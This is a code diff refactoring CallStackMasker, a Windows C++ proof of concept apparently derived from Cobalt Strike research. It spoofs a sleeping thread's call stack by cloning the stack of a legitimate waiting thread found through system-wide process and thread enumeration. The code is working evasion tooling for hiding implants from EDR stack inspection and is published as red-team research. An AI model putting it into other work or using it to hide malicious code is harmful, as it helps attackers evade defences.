@@ -2,6 +2,7 @@
 * Title: CallStackMasker
 * Resources:
 *	- https://github.com/Cobalt-Strike/CallStackMasker
+*	- https://www.cobaltstrike.com/blog/behind-the-mask-spoofing-call-stacks-dynamically-with-timers
 */
 #include <Windows.h>
 #include <ehdata.h>
@@ -80,12 +81,12 @@ NTSTATUS GetModuleBaseNameWrapper(HANDLE hProcess, PVOID pTargetAddr, std::strin
 }
 
 NTSTATUS GetImageBase(const StackFrame& stackFrame) {
-	HMODULE hTmpImageBase = nullptr;
-
 	// Check if image base has already been resolved.
 	if (imageBaseMap.count(stackFrame.targetDll)) {
 		return STATUS_SUCCESS;
 	}
+
+	HMODULE hTmpImageBase = nullptr;
 
 	// Check if current frame contains a non-standard dll and load if so.
 	if (stackFrame.requiresLoadLibrary) {
@@ -94,9 +95,8 @@ NTSTATUS GetImageBase(const StackFrame& stackFrame) {
 			return STATUS_DLL_NOT_FOUND;
 		}
 	}
-
-	// If we haven't already recorded the image base capture it now.
-	if (!hTmpImageBase) {
+	else {
+		// If we haven't already recorded the image base capture it now.
 		hTmpImageBase = GetModuleHandle(stackFrame.targetDll.c_str());
 		if (!hTmpImageBase) {
 			return STATUS_DLL_NOT_FOUND;
@@ -109,13 +109,136 @@ NTSTATUS GetImageBase(const StackFrame& stackFrame) {
 	return STATUS_SUCCESS;
 }
 
+NTSTATUS GetThreadStartAddress(const HANDLE hThread, PVOID& pStartAddr) {
+	NTSTATUS status = STATUS_SUCCESS;
+
+	ntQueryInformationThread = reinterpret_cast<_NtQueryInformationThread>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"));
+	if (!ntQueryInformationThread) {
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	status = ntQueryInformationThread(hThread, ThreadQuerySetWin32StartAddress, &pStartAddr, sizeof(pStartAddr), nullptr);
+	if (!NT_SUCCESS(status)) {
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	return status;
+}
+
+BOOL IsThreadAMatch(const HANDLE hProcess, const DWORD pid, const DWORD tid, threadToSpoof& thread) {
+	BOOL bMatch = FALSE;
+
+	HANDLE hThread = INVALID_HANDLE_VALUE;
+	HANDLE hHeap = INVALID_HANDLE_VALUE;
+	BOOL bIsWow64 = false;
+	CONTEXT ctx = { 0 };
+
+	PVOID returnAddress = NULL;
+	PVOID remoteStartAddress = NULL;
+	ULONG totalStackSize = 0;
+
+	// [1] Open handle to thread.
+	hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
+	if (!hThread)
+	{
+		std::cout << "[-] Failed to open a handle to thread: " << tid << "\n";
+		goto Cleanup;
+	}
+
+	// [2] Get thread context.
+	std::cout << "[+] Scanning tid: " << std::dec << tid << "\n";
+	ctx.ContextFlags = CONTEXT_FULL;
+	if (!GetThreadContext(hThread, &ctx))
+	{
+		std::cout << "[-] Failed to get thread context for: " << tid << "\n";
+		goto Cleanup;
+	}
+
+	// [3] Retrieve the last return address on the stack and check if it is
+	// our target function to spoof.
+	returnAddress = readProcessMemory<PVOID>(hProcess, (LPVOID)ctx.Rsp);
+	if (!CheckIfAddressIsWithinTargetFunc(returnAddress, std::string("kernelbase"), std::string("WaitForSingleObjectEx")))
+	{
+		goto Cleanup;
+	}
+
+	// [4] Now try and confirm we can unwind the stack and calculate total required stack size.
+	if (!NT_SUCCESS(CalculateDynamicStackSize(hProcess, ctx, totalStackSize)))
+	{
+		goto Cleanup;
+	}
+
+	// [5] Lastly, we need to retrieve the threads starting address in order to spoof it.
+	if (!NT_SUCCESS(GetThreadStartAddress(hThread, remoteStartAddress)))
+	{
+		std::cout << "[-] Error retrieving thread start address\n";
+		goto Cleanup;
+	}
+
+	// [6] The start address is specific to context of remote process, so ensure the
+	// offset is correct for wherever the dll is loaded in our memory space.
+	if (!NT_SUCCESS(NormalizeAddress(hProcess, remoteStartAddress, thread.startAddr, FALSE, imageMap())))
+	{
+		std::cout << "[-] Error re-calculating thread start address\n";
+		goto Cleanup;
+	}
+
+	// [7] At this stage, the thread stack is a match so make a copy.
+	// To simplify this PoC (and to avoid any TOCTOU style issues) copy the stack
+	// now and use the same buffer repeatedly. NB this is currently never freed,
+	// but it is irrelevant as PoC runs on while true loop.
+	hHeap = GetProcessHeap();
+	thread.pFakeStackBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, totalStackSize);
+	if (!ReadProcessMemory(hProcess, (LPCVOID)ctx.Rsp, thread.pFakeStackBuffer, totalStackSize, NULL))
+	{
+		HeapFree(hHeap, NULL, thread.pFakeStackBuffer);
+		thread.pFakeStackBuffer = NULL;
+		goto Cleanup;
+	}
+
+	thread.dwPid = pid;
+	thread.dwTid = tid;
+	thread.totalRequiredStackSize = totalStackSize;
+
+	bMatch = TRUE;
+
+Cleanup:
+	CloseHandle(hThread);
+	return bMatch;
+}
+
+BOOL CheckIfAddressIsWithinTargetFunc(const PVOID pTargetAddr, const std::string targetModuleName, const std::string targetFuncName) {
+	HMODULE hModule = GetModuleHandleA(targetModuleName.c_str());
+	if (!hModule) return FALSE;
+	PVOID pTargetFunc = GetProcAddress(hModule, targetFuncName.c_str());
+	if (!pTargetFunc) return FALSE;
+
+	DWORD64 dwImageBase = 0;
+	PUNWIND_HISTORY_TABLE pHistoryTable = nullptr;
+
+	PRUNTIME_FUNCTION pRuntimeFunc = RtlLookupFunctionEntry(
+		(DWORD64)pTargetFunc,
+		&dwImageBase,
+		pHistoryTable
+	);
+	if (!pRuntimeFunc) return FALSE;
+
+	void* pTargetFuncStart = (PCHAR)hModule + pRuntimeFunc->BeginAddress;
+	void* pTargetFuncEnd = (PCHAR)hModule + pRuntimeFunc->EndAddress;
+	if ((pTargetFuncStart < pTargetAddr) && (pTargetAddr < pTargetFuncEnd)) {
+		return TRUE;
+	}
+
+	return FALSE;
+}
+
 NTSTATUS CalculateReturnAddress(StackFrame& stackFrame) {
 	try {
-		const PVOID pTargetImageBaseAddr = imageBaseMap.at(stackFrame.targetDll);
-		if (!pTargetImageBaseAddr) {
+		HMODULE hModule = imageBaseMap.at(stackFrame.targetDll);
+		if (!hModule) {
 			return STATUS_DLL_NOT_FOUND;
 		}
-		auto funcAddr = GetProcAddress((HMODULE)pTargetImageBaseAddr, stackFrame.targetFunc.c_str());
+		auto funcAddr = GetProcAddress(hModule, stackFrame.targetFunc.c_str());
 		if (!funcAddr) {
 			return STATUS_ORDINAL_NOT_FOUND;
 		}
@@ -142,7 +265,7 @@ NTSTATUS CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunc, const DWORD6
 	while (index < pUnwindInfo->CountOfCodes) {
 		unwindOp = pUnwindInfo->UnwindCode[index].UnwindOp;
 		opInfo = pUnwindInfo->UnwindCode[index].OpInfo;
-		// Loop over unwind codes and calculate total stack size space used by target function.
+		// Calculate total stack size space used by target function.
 		switch (unwindOp) {
 		case UWOP_PUSH_NONVOL:
 			// UWOP_PUSH_NONVOL is 8 bytes.
@@ -213,32 +336,6 @@ NTSTATUS CalculateFunctionStackSizeWrapper(StackFrame& stackFrame) {
 	}
 
 	return CalculateFunctionStackSize(pRuntimeFunc, dwImageBase, stackFrame);
-}
-
-NTSTATUS InitializeSpoofedCallStack(std::vector<StackFrame>& targetCallStack) {
-	NTSTATUS status = STATUS_SUCCESS;
-
-	for (auto stackFrame = targetCallStack.begin(); stackFrame != targetCallStack.end(); stackFrame++) {
-		// Get image base for current stack frame.
-		status = GetImageBase(*stackFrame);
-		if (!NT_SUCCESS(status)) {
-			return status;
-		}
-
-		// Calculate ret address for current stack frame.
-		status = CalculateReturnAddress(*stackFrame);
-		if (!NT_SUCCESS(status)) {
-			return status;
-		}
-
-		// Calculate the total stack size for ret function.
-		status = CalculateFunctionStackSizeWrapper(*stackFrame);
-		if (!NT_SUCCESS(status)) {
-			return status;
-		}
-	}
-
-	return status;
 }
 
 ULONG CalculateStaticStackSize(const std::vector<StackFrame>& targetCallStack) {
@@ -325,202 +422,7 @@ Cleanup:
 	return status;
 }
 
-BOOL IsThreadAMatch(const HANDLE hProcess, const DWORD pid, const DWORD tid, threadToSpoof& thread) {
-	BOOL bMatch = FALSE;
-
-	HANDLE hThread = INVALID_HANDLE_VALUE;
-	HANDLE hHeap = INVALID_HANDLE_VALUE;
-	BOOL bIsWow64 = false;
-	CONTEXT ctx = { 0 };
-
-	PVOID returnAddress = NULL;
-	PVOID remoteStartAddress = NULL;
-	ULONG totalStackSize = 0;
-
-	// [1] Open handle to thread.
-	hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
-	if (!hThread)
-	{
-		std::cout << "[-] Failed to open a handle to thread: " << tid << "\n";
-		goto Cleanup;
-	}
-
-	// [2] Get thread context.
-	std::cout << "[+] Scanning tid: " << std::dec << tid << "\n";
-	ctx.ContextFlags = CONTEXT_FULL;
-	if (!GetThreadContext(hThread, &ctx))
-	{
-		std::cout << "[-] Failed to get thread context for: " << tid << "\n";
-		goto Cleanup;
-	}
-
-	// [3] Retrieve the last return address on the stack and check if it is
-	// our target function to spoof.
-	returnAddress = readProcessMemory<PVOID>(hProcess, (LPVOID)ctx.Rsp);
-	if (!CheckIfAddressIsWithinTargetFunc(returnAddress, std::string("kernelbase"), std::string("WaitForSingleObjectEx")))
-	{
-		goto Cleanup;
-	}
-
-	// [4] Now try and confirm we can unwind the stack and calculate total required stack size.
-	if (!NT_SUCCESS(CalculateDynamicStackSize(hProcess, ctx, totalStackSize)))
-	{
-		goto Cleanup;
-	}
-
-	// [5] Lastly, we need to retrieve the threads starting address in order to spoof it.
-	if (!NT_SUCCESS(GetThreadStartAddress(hThread, remoteStartAddress)))
-	{
-		std::cout << "[-] Error retrieving thread start address\n";
-		goto Cleanup;
-	}
-
-	// [6] The start address is specific to context of remote process, so ensure the
-	// offset is correct for wherever the dll is loaded in our memory space.
-	if (!NT_SUCCESS(NormalizeAddress(hProcess, remoteStartAddress, thread.startAddr, FALSE, imageMap())))
-	{
-		std::cout << "[-] Error re-calculating thread start address\n";
-		goto Cleanup;
-	}
-
-	// [7] At this stage, the thread stack is a match so make a copy.
-	// To simplify this PoC (and to avoid any TOCTOU style issues) copy the stack
-	// now and use the same buffer repeatedly. NB this is currently never freed,
-	// but it is irrelevant as PoC runs on while true loop.
-	hHeap = GetProcessHeap();
-	thread.pFakeStackBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, totalStackSize);
-	if (!ReadProcessMemory(hProcess, (LPCVOID)ctx.Rsp, thread.pFakeStackBuffer, totalStackSize, NULL))
-	{
-		HeapFree(hHeap, NULL, thread.pFakeStackBuffer);
-		thread.pFakeStackBuffer = NULL;
-		goto Cleanup;
-	}
-
-	thread.dwPid = pid;
-	thread.dwTid = tid;
-	thread.totalRequiredStackSize = totalStackSize;
-
-	bMatch = TRUE;
-
-Cleanup:
-	CloseHandle(hThread);
-	return bMatch;
-}
-
-NTSTATUS InitializeDynamicCallStackSpoofing(const ULONG waitReason, threadToSpoof& thread) {
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
-
-	ULONG uBufferSize = 0;
-	PVOID pBuffer = NULL;
-	_NtQuerySystemInformation ntQuerySystemInformation = NULL;
-	SYSTEM_PROCESS_INFORMATION* pSystemProcessInformation = NULL;
-	SYSTEM_THREAD_INFORMATION systemThreadInformation = { 0 };
-
-	// [1] Enumerate threads system wide and locate a thread with desired WaitReason.
-	ntQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
-	if (!ntQuerySystemInformation)
-	{
-		status = STATUS_UNSUCCESSFUL;
-		goto Cleanup;
-	}
-	status = ntQuerySystemInformation(SystemProcessInformation, pBuffer, uBufferSize, &uBufferSize);
-	if (STATUS_INFO_LENGTH_MISMATCH != status)
-	{
-		status = STATUS_UNSUCCESSFUL;
-		goto Cleanup;
-	}
-	pBuffer = LocalAlloc(LMEM_FIXED, uBufferSize);
-	if (!pBuffer)
-	{
-		status = STATUS_UNSUCCESSFUL;
-		goto Cleanup;
-	}
-	if (!NT_SUCCESS(ntQuerySystemInformation(SystemProcessInformation, pBuffer, uBufferSize, &uBufferSize)))
-	{
-		status = STATUS_UNSUCCESSFUL;
-		goto Cleanup;
-	}
-	pSystemProcessInformation = (SYSTEM_PROCESS_INFORMATION*)pBuffer;
-
-	// [2] Loop over threads and attempt to find one where the last address on the
-	// stack is located within out target waiting function (e.g. WaitForSingleObjectEx).
-	while (pSystemProcessInformation && pSystemProcessInformation->NextEntryOffset)
-	{
-		BOOL bEnumThreads = true;
-		HANDLE hProcess = INVALID_HANDLE_VALUE;
-		BOOL bIsWow64 = false;
-
-		if (NULL != pSystemProcessInformation->ImageName.Buffer)
-		{
-			std::wcout << "[+] Searching process: " << pSystemProcessInformation->ImageName.Buffer << " (" << pSystemProcessInformation->ProcessId << ")" << "\n";
-		}
-
-		// [3] Attempt to open a handle to target process.
-		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pSystemProcessInformation->ProcessId);
-		if (!hProcess)
-		{
-			std::cout << "[-] Failed to open a handle to process: " << pSystemProcessInformation->ProcessId << "\n";
-			bEnumThreads = false;
-		}
-
-		// [4] Ignore WOW64.
-		if (bEnumThreads && IsWow64Process(hProcess, &bIsWow64))
-		{
-			if (bIsWow64)
-			{
-				std::cout << "[-] Ignoring WOW64\n";
-				bEnumThreads = false;
-			}
-		}
-
-		// [5] Enumerate threads.
-		if (bEnumThreads)
-		{
-			for (ULONG i = 0; i < pSystemProcessInformation->NumberOfThreads; i++)
-			{
-				systemThreadInformation = pSystemProcessInformation->ThreadInfos[i];
-
-				// Ignore any threads not in our desired wait state.
-				if (waitReason != systemThreadInformation.WaitReason)
-				{
-					continue;
-				}
-
-				// [6] Attempt to unwind the stack and check if stack is in our desired wait state.
-				if (IsThreadAMatch(hProcess, pSystemProcessInformation->ProcessId, (DWORD)systemThreadInformation.ClientId.UniqueThread, thread))
-				{
-					// We have found a thread to clone!
-					std::cout << "    [+] Successfully located a thread call stack to clone!" << "\n";
-					std::wcout << "    [+] Cloning call stack from process: " << pSystemProcessInformation->ImageName.Buffer << "\n";
-					std::cout << "    [+] Cloning call stack from pid: " << std::dec << pSystemProcessInformation->ProcessId << "\n";
-					std::cout << "    [+] Cloning call stack from tid: " << std::dec << (DWORD)systemThreadInformation.ClientId.UniqueThread << "\n";
-					std::cout << "    [+] Target thread start address is: 0x" << std::hex << thread.startAddr << "\n";
-					std::cout << "    [+] Total stack size required: 0x" << thread.totalRequiredStackSize << "\n";
-					status = STATUS_SUCCESS;
-					CloseHandle(hProcess);
-					goto Cleanup;
-				}
-			}
-		}
-		// Avoid leaking handles.
-		if (hProcess)
-		{
-			CloseHandle(hProcess);
-		}
-		pSystemProcessInformation = (SYSTEM_PROCESS_INFORMATION*)((LPBYTE)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
-	}
-
-	// [7] If we reached here we did not find a suitable thread call stack to spoof.
-	std::cout << "[!] Could not find a suitable callstack to clone.\n";
-
-Cleanup:
-	LocalFree(pBuffer);
-	return status;
-}
-
 NTSTATUS CreateFakeStackInBuffer(const std::vector<StackFrame>& targetCallStack, const PVOID pSpoofedStack) {
-	NTSTATUS status = STATUS_SUCCESS;
-
 	if (!pSpoofedStack) {
 		return STATUS_INVALID_PARAMETER;
 	}
@@ -536,6 +438,32 @@ NTSTATUS CreateFakeStackInBuffer(const std::vector<StackFrame>& targetCallStack,
 	// Stop stack unwinding by writing 0x0 at end of buffer.
 	*index = 0x0;
 
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS InitializeSpoofedCallStack(std::vector<StackFrame>& targetCallStack) {
+	NTSTATUS status = STATUS_SUCCESS;
+
+	for (auto stackFrame = targetCallStack.begin(); stackFrame != targetCallStack.end(); stackFrame++) {
+		// Get image base for current stack frame.
+		status = GetImageBase(*stackFrame);
+		if (!NT_SUCCESS(status)) {
+			return status;
+		}
+
+		// Calculate ret address for current stack frame.
+		status = CalculateReturnAddress(*stackFrame);
+		if (!NT_SUCCESS(status)) {
+			return status;
+		}
+
+		// Calculate the total stack size for ret function.
+		status = CalculateFunctionStackSizeWrapper(*stackFrame);
+		if (!NT_SUCCESS(status)) {
+			return status;
+		}
+	}
+
 	return status;
 }
 
@@ -544,7 +472,7 @@ NTSTATUS InitializeStaticCallStackSpoofing(std::vector<StackFrame>& targetCallSt
 
 	status = InitializeSpoofedCallStack(targetCallStack);
 	if (!NT_SUCCESS(status)) {
-		return STATUS_UNSUCCESSFUL;	
+		return STATUS_UNSUCCESSFUL;
 	}
 
 	// Calculate total stack space required for fake call stack.
@@ -569,45 +497,95 @@ NTSTATUS InitializeStaticCallStackSpoofing(std::vector<StackFrame>& targetCallSt
 	return status;
 }
 
-NTSTATUS GetThreadStartAddress(const HANDLE hThread, PVOID& pStartAddr) {
-	NTSTATUS status = STATUS_SUCCESS;
+NTSTATUS InitializeDynamicCallStackSpoofing(const ULONG waitReason, threadToSpoof& thread) {
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
 
-	ntQueryInformationThread = reinterpret_cast<_NtQueryInformationThread>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"));
-	if (!ntQueryInformationThread) {
+	PVOID pBuffer = nullptr;
+	ULONG uBufferSize = 0;
+
+	// Enumerate threads system wide and locate a thread with desired WaitReason.
+	_NtQuerySystemInformation ntQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
+	if (!ntQuerySystemInformation) {
+		status = STATUS_UNSUCCESSFUL;
+		return status;
+	}
+
+	status = ntQuerySystemInformation(SystemProcessInformation, pBuffer, uBufferSize, &uBufferSize);
+	if (status != STATUS_INFO_LENGTH_MISMATCH) {
+		LocalFree(pBuffer);
 		return STATUS_UNSUCCESSFUL;
 	}
 
-	status = ntQueryInformationThread(hThread, ThreadQuerySetWin32StartAddress, &pStartAddr, sizeof(pStartAddr), nullptr);
+	pBuffer = LocalAlloc(LMEM_FIXED, uBufferSize);
+	if (!pBuffer) {
+		LocalFree(pBuffer);
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	status = ntQuerySystemInformation(SystemProcessInformation, pBuffer, uBufferSize, &uBufferSize);
 	if (!NT_SUCCESS(status)) {
+		LocalFree(pBuffer);
 		return STATUS_UNSUCCESSFUL;
 	}
 
-	return status;
-}
+	SYSTEM_PROCESS_INFORMATION* pSystemProcessInformation = (SYSTEM_PROCESS_INFORMATION*)pBuffer;
+	SYSTEM_THREAD_INFORMATION systemThreadInformation = { 0 };
 
-BOOL CheckIfAddressIsWithinTargetFunc(const PVOID pTargetAddr, const std::string targetModuleName, const std::string targetFuncName) {
-	HMODULE hModule = GetModuleHandleA(targetModuleName.c_str());
-	if (!hModule) return FALSE;
-	PVOID pTargetFunc = GetProcAddress(hModule, targetFuncName.c_str());
-	if (!pTargetFunc) return FALSE;
+	// Loop over threads and attempt to find one where the last address on the
+	// stack is located within out target waiting function (e.g. WaitForSingleObjectEx).
+	while (pSystemProcessInformation && pSystemProcessInformation->NextEntryOffset) {
+		BOOL bEnumThreads = true;
+		BOOL bIsWow64 = false;
 
-	DWORD64 dwImageBase = 0;
-	PUNWIND_HISTORY_TABLE pHistoryTable = nullptr;
+		if (pSystemProcessInformation->ImageName.Buffer) {
+			std::wcout << "[+] Searching process: " << pSystemProcessInformation->ImageName.Buffer << " (" << pSystemProcessInformation->ProcessId << ")" << "\n";
+		}
 
-	PRUNTIME_FUNCTION pRuntimeFunc = RtlLookupFunctionEntry(
-		(DWORD64)pTargetFunc,
-		&dwImageBase,
-		pHistoryTable
-	);
-	if (!pRuntimeFunc) return FALSE;
+		// [3] Attempt to open a handle to target process.
+		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pSystemProcessInformation->ProcessId);
+		if (!hProcess)
+			bEnumThreads = false;
 
-	void* pTargetFuncStart = (PCHAR)hModule + pRuntimeFunc->BeginAddress;
-	void* pTargetFuncEnd = (PCHAR)hModule + pRuntimeFunc->EndAddress;
-	if ((pTargetFuncStart < pTargetAddr) && (pTargetAddr < pTargetFuncEnd)) {
-		return TRUE;
+		// Ignore WOW64.
+		if (bEnumThreads && IsWow64Process(hProcess, &bIsWow64)) {
+			if (bIsWow64)
+				bEnumThreads = false;
+		}
+
+		// Enumerate threads.
+		if (bEnumThreads) {
+			for (ULONG i = 0; i < pSystemProcessInformation->NumberOfThreads; i++) {
+				systemThreadInformation = pSystemProcessInformation->ThreadInfos[i];
+
+				// Ignore any threads not in our desired wait state.
+				if (waitReason != systemThreadInformation.WaitReason) continue;
+
+				// Attempt to unwind the stack and check if stack is in our desired wait state.
+				if (IsThreadAMatch(hProcess, pSystemProcessInformation->ProcessId, (DWORD)systemThreadInformation.ClientId.UniqueThread, thread)) {
+					// We have found a thread to clone!
+					std::cout << "    [+] Successfully located a thread call stack to clone!" << "\n";
+					std::wcout << "    [+] Cloning call stack from process: " << pSystemProcessInformation->ImageName.Buffer << "\n";
+					std::cout << "    [+] Cloning call stack from pid: " << std::dec << pSystemProcessInformation->ProcessId << "\n";
+					std::cout << "    [+] Cloning call stack from tid: " << std::dec << (DWORD)systemThreadInformation.ClientId.UniqueThread << "\n";
+					std::cout << "    [+] Target thread start address is: 0x" << std::hex << thread.startAddr << "\n";
+					std::cout << "    [+] Total stack size required: 0x" << thread.totalRequiredStackSize << "\n";
+					
+					CloseHandle(hProcess);
+					LocalFree(pBuffer);
+					return STATUS_SUCCESS;
+				}
+			}
+		}
+		// Avoid leaking handles.
+		if (hProcess) CloseHandle(hProcess);
+		pSystemProcessInformation = (SYSTEM_PROCESS_INFORMATION*)((LPBYTE)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
 	}
 
-	return FALSE;
+	// If we reached here we did not find a suitable thread call stack to spoof.
+	std::cout << "[!] Could not find a suitable callstack to clone.\n";
+
+	LocalFree(pBuffer);
+	return status;
 }
 
 VOID CallStackMaskerSleep(DWORD dwSleepTime) {
@@ -684,7 +662,7 @@ VOID CallStackMaskerSleep(DWORD dwSleepTime) {
 }
 
 VOID Go() {
-	DWORD dwSleepTime = 4000;
+	DWORD dwSleepTime = 4000; // Replace it
 
 	do {
 		printf("CallStackMaskerSleep: Start\n");
@@ -694,9 +672,7 @@ VOID Go() {
 }
 
 BOOL CallStackMasker() {
-	// Replace the following values with your preffered ones.
-	DWORD dwSleepTime = 4000; // Milliseconds
-	BOOL bStaticCallStack = TRUE;
+	BOOL bStaticCallStack = TRUE; // Change it if needed
 
 	NTSTATUS status = STATUS_SUCCESS;
 	PVOID pStartAddr = nullptr;
